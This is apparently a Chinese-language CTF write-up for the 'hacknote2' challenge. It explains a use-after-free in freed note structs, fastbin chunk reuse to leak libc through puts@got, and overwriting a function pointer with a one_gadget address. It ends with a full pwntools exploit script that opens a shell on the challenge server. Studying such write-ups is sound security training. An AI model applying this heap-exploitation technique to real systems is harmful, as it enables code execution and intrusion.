## hacknote2
### solution
本題原始碼中free後沒有沒有將pointer設為NULL，因此有可以使用的Use after free漏洞。
```c
if(notelist[idx]){
	free(notelist[idx]->content);
	free(notelist[idx]);
	puts("Success");
}
```

而note的結構如下
```c
struct note {
	void (*printnote)();
	char *content ;
};
```
大小為16bytes，其中第一個欄位是function pointer，overwrite後可以控制rip，而第二個欄位是char pointer，若是我們不去更動`printnote`，則可以改寫此處來read arbitrary memory。

本題初步來看沒辦法有任意寫入，因此比較可能的作法為使用`content` leak出libc，再複寫`printnote`跳到libc中可用的gadget。

當在`add_note`時一共會`malloc`兩次，第一次固定16bytes
，allocate一個`struct note`放到notelist中，第二次allocate `note->content`則是可指定大小。

接著，本題note最大數量為5，以global variable `count`紀錄當前note數量，但因為`del_note()`時並不會將`count`遞減，因此最多只能`add_note()`五次。

因此若是要overwrite一次，則要先`add_note`兩次，大小不能為16，再依序`del_note`，接著再次`add_note`指定大小為16，第一次`malloc struct note`(16bytes)因為fastbin是LIFO，會拿到第二次`add_note`的chunk，而第二次`malloc content`(16bytes)就會拿到原本第一次`add_note`的chunk。
```c
notelist[2] == notelist[1]
notelist[2]->content == notelist[0]
```

本題中我們需要overwrite兩次，第一次leak libc，第二次控制rip。
我們首先`add_note`二次，再依序delete，第一次overwrite時，payload前8bytes保持原本的`print_note_content`，後8bytes送`puts@got`，結果為：
```c
notelist[2] == notelist[1]
notelist[2]->content == notelist[0]
notelist[0]->print_note == print_note_content
notelist[0]->content == puts@got
```
接著我們print `notelist[0]`即可leak出`puts@got`，此時要再送一次payload，而fastbin中已經沒有chunk，因此要先把剛剛allocate的`notelist[2]`再次free掉，之後就會有兩塊16bytes的chunk(`notelist[0]`,`notelist[1]`)，此時再`add_note`一次則會依序拿到`notelist[1]`和`notelist[0]`，將payload寫為要跳的target位址即可，結果如下：
```c
notelist[3] == notelist[2] == notelist[1]
notelist[3]->content == notelist[0]
notelist[0]->print_note == target
```
此時print `notelist[0]`即可jump到target。

最後則是考慮target，由於沒有漏洞能寫GOT，也無法給system參數，因此這裡使用了david942j/one_gadget工具來從libc找能用的gadget，結果共有3個相依於rsp的one gadget
```
0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
0xf0274	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
0xf1117	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
使用gdb簡易測試後可以發現剛好呼叫的時候`[rsp+0x50], [rsp+0x70]`都會是0，因此這邊選了`0xf0274`的gadget來使用，最後跳過去即可拿到shell

### script
```python
#!/usr/bin/env python3
from pwn import *

context(arch="amd64")

#r = process("hacknote2")
r = remote("csie.ctf.tw", 10139)
binary = ELF("hacknote2")
libc = ELF("libc.so.6")
one_gadget = 0xf0274 # execve("/bin/sh", rsp+0x50, environ)

def add_note(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(content)

def del_note(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def print_note(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

# leak libc
add_note(50, "aaaaa")
add_note(50, "aaaaa")
del_note(0)
del_note(1)
# will write to note 0
add_note(16, p64(binary.symbols[b'print_note_content']) + p64(binary.got[b'puts']))

print_note(0)
puts = u64(r.recvuntil('\n', drop=True).ljust(8, b'\x00'))
del_note(2)

# jump to one_gadget
libc_base = puts - libc.symbols[b'puts']
# will write to note 0
add_note(16, p64(libc_base + one_gadget))

print_note(0)

r.interactive()
```
